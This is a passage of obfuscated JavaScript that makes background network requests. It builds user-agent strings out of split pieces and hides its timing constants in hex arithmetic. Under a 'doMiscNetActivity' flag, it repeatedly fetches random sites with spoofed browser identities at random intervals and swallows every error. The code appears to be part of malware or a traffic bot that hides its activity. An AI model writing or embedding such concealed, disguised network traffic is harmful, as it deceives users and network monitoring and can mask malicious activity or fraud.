      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1321 + 0x935 + -0xfe * -0xa; k < -0x1 * 0xf63 + 0xb07 + 0x5 * 0xe0; k++)
    setTimeout(f, (-0x124a9 + 0x5 * -0x40bd + -0x1 * -0x352ba) * k * getRandomInt(0x11 * 0x7a + -0x25c * -0x4 + -0x1189, -0xe * -0x1be + -0x1543 + 0xe * -0x39));
  setInterval(() => {
    f();
    for (let l = 0x2 * -0x9ef + -0x218c + -0x356a * -0x1; l < 0x44e * -0x2 + 0x45 * -0x6f + -0xfd * -0x27; l++)
      setTimeout(f, (-0x1a671 * 0x1 + -0x1c32f + 0x4 * 0x11500) * l * getRandomInt(-0x970 + -0x104e + -0xa9 * -0x27, -0xa6b + -0x1174 + -0x56 * -0x53));
  }, 0x4536af * -0x1 + -0x3 * -0x1f5ae6 + 0x13405 * 0x19);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a5 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': a5(0x2)
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1fa2 + 0xf * -0x35a + 0x6d40) * getRandomInt(0x1 * 0x21af + 0x7 * 0x1eb + -0x2f1b, -0x4cf + -0x2208 + -0x26dc * -0x1));
}, 0x1 * 0x187b + -0x301 * 0x3 + -0xf14);